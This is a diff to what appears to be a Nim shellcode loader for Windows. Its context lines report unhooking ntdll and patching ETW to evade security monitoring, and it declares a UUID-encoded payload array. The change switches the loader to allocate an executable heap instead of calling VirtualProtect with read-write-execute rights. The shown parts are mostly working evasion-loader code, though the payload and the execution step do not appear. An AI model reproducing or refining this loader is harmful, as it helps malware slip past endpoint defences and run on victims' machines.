@@ -3,7 +3,7 @@ import strutils
 import ptr_math
 import strformat
 import dynlib
-#import os
+# import osproc
 
 const SIZE = 18  
 var UUIDARR = allocCStringArray([
@@ -104,14 +104,13 @@ when isMainModule:
   echo fmt"[*] unhook Ntdll: {bool(result_unhook)}"
   echo fmt"[*] patch etw: {bool(result_etw_patch)}"
   if result_unhook and result_etw_patch:
-    echo fmt"[*] Allocating Heap Memory"
-    # let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
-    let hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0, 0)
+    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+    # let hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0)
     let ha = HeapAlloc(hHeap, 0, 0x100000)
-    #sleep 60000
-    var oldProtect: DWORD
-    if not VirtualProtect(ha, 0x100000, PAGE_EXECUTE_READWRITE, addr oldProtect):
-      raise newException(Exception, "Failed to change memory protection")
+    # sleep 60000
+    # var oldProtect: DWORD
+    # if not VirtualProtect(ha, 0x100000, PAGE_EXECUTE_READWRITE, addr oldProtect):
+    #   raise newException(Exception, "Failed to change memory protection")
     var hptr = cast[DWORD_PTR](ha)
     if hptr != 0:
         echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
